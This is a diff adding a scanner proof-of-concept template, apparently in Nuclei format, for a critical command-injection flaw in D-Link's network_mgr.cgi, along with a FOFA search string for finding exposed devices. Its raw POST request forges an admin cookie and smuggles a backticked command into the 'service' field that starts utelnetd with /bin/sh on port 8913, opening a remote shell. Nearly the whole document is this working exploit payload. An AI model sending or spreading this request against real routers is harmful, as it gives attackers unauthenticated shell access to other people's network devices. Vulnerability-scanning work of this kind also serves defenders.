@@ -1,0 +1,48 @@
+id: poc-vyk5dvnfxfg1qnzm
+info:
+  name: D-Link network_mgr.cgi存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vyk5dvnfxfg1qnzm'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vyk5dvnfxfg1qnzm
+    fofa: '"D-Link-DIR"'
+http:
+- raw:
+  - 'POST /cgi-bin/network_mgr.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Length: 98
+
+    Origin: [http://192.168.0.32](http://192.168.0.32)
+
+    Connection: keep-alive
+
+    Referer: [http://192.168.0.32/web/backup_mgr/s3_main.html](http://192.168.0.32/web/backup_mgr/s3_main.html)
+
+    Cookie: username=admin
+
+    Priority: u=0
+
+
+    cmd=cgi_portforwarding_add&service=`utelnetd -p 8913 -l /bin/sh`&e_port=&p_port=&protocol=&enable=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
